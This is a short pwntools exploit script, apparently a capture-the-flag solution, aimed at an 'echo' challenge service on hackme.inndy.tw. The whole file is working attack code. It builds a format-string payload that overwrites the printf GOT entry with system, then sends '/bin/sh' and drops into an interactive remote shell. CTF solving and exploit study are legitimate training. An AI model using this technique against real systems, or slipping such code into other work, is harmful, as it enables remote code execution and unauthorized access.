from pwn import*
context.log_level= "debug"

p = remote('hackme.inndy.tw',7711) 
#p = process('./echo')
elf = ELF('./echo')

system = elf.symbols['system']
printf_got = elf.got['printf']
bss = elf.bss()
offset = 7
payload = fmtstr_payload(offset,{printf_got : system}) # change the got of printf to system
p.send(payload)

p.send("/bin/sh\x00")
p.interactive()